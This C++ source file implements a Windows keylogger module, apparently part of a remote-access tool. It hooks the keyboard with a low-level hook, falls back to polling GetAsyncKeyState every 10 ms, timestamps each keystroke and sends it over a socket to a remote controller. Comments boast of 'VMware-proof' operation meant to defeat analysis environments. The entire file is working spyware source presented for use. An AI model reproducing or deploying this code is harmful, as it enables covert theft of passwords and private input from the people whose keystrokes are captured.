#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <mutex>
#include <thread>
#include <cstdio>
#include "utils.h"

std::mutex logMutex;
sock_t global_sock = INVALID_SOCKET;
std::string global_client_id;
json global_resp;
bool running = true;

// ✅ FASTER: 10ms polling + better key detection
std::string getKeyName(WORD vkCode) {
    static const std::pair<WORD, const char*> specialKeys[] = {
        {VK_BACK, "[BACKSPACE]"}, {VK_TAB, "[TAB]"}, {VK_RETURN, "[ENTER]"},
        {VK_SHIFT, "[SHIFT]"}, {VK_CONTROL, "[CTRL]"}, {VK_MENU, "[ALT]"},
        {VK_SPACE, " "}, {VK_ESCAPE, "[ESC]"}, {VK_DELETE, "[DEL]"}
    };

    for (const auto& pair : specialKeys) {
        if (vkCode == pair.first) return pair.second;
    }

    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        return std::string("[F") + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    BYTE state[256];
    GetKeyboardState(state);
    UINT scan = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    char ch[2] = {0};
    int len = ToAscii(vkCode, scan, state, (LPWORD)ch, 0);
    
    if (len == 1) return std::string(1, ch[0]);
    
    char name[32];
    if (GetKeyNameTextA(MAKELPARAM(0, vkCode << 16), name, 32) > 0) {
        return std::string(name);
    }
    
    return "";
}

// ✅ TURBO POLLING: 10ms + state tracking
void turbo_keylog_thread(sock_t sock, const std::string& client) {
    global_sock = sock;
    global_client_id = client;
    printf("[KEYLOG] 🚀 TURBO MODE (10ms VMware-proof)\n");
    
    WORD last_keys[256] = {0};
    
    while (running && global_sock != INVALID_SOCKET) {
        for (WORD vk = 8; vk < 256; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            bool pressed = (state & 0x8000);
            
            // Edge detection: key just pressed
            if (pressed && !last_keys[vk]) {
                std::string key = getKeyName(vk);
                if (!key.empty()) {
                    SYSTEMTIME st;
                    GetLocalTime(&st);
                    char timestamp[64];
                    snprintf(timestamp, sizeof(timestamp), "[%02d:%02d:%02d] %s",
                             st.wHour, st.wMinute, st.wSecond, key.c_str());
                    
                    {
                        std::lock_guard<std::mutex> lock(logMutex);
                        send_result(global_sock, global_resp, client, timestamp);
                        printf("🎹 CAPTURED: %s\n", timestamp);
                    }
                }
            }
            last_keys[vk] = pressed ? 1 : 0;
        }
        Sleep(10);  // 10ms = 100 FPS
    }
}

// ✅ VMware bypass: Direct console hook
LRESULT CALLBACK ConsoleProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        std::string key = getKeyName(pKb->vkCode);
        if (!key.empty()) {
            SYSTEMTIME st;
            GetLocalTime(&st);
            char timestamp[64];
            snprintf(timestamp, sizeof(timestamp), "[%02d:%02d:%02d] %s",
                     st.wHour, st.wMinute, st.wSecond, key.c_str());
            
            std::lock_guard<std::mutex> lock(logMutex);
            if (global_sock != INVALID_SOCKET) {
                send_result(global_sock, global_resp, global_client_id, timestamp);
                printf("⌨️  CONSOLE: %s\n", timestamp);
            }
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

void handle_keylogger(sock_t sock, const json& payload, const std::string& client) {
    global_sock = sock;
    global_client_id = client;
    global_resp = payload;
    running = true;
    
    printf("🔥 KEYLOG START: %s\n", client.c_str());
    
    // Try LL hook first (rarely works in VMware)
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, ConsoleProc, GetModuleHandle(NULL), 0);
    bool hook_success = (hook != NULL);
    
    json response = payload;
    if (hook_success) {
        response["status"] = "hook";
        printf("✅ LOW LEVEL HOOK OK\n");
    } else {
        response["status"] = "turbo";
        printf("❌ HOOK FAILED → TURBO POLLING\n");
    }
    
    send_result(sock, response, client, "Keylogger active");
    
    // Always run turbo polling (backup)
    std::thread key_thread(turbo_keylog_thread, sock, client);
    
    if (hook_success) {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) && running) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hook);
    }
    
    key_thread.join();
    running = false;
    printf("🛑 Keylog stopped\n");
}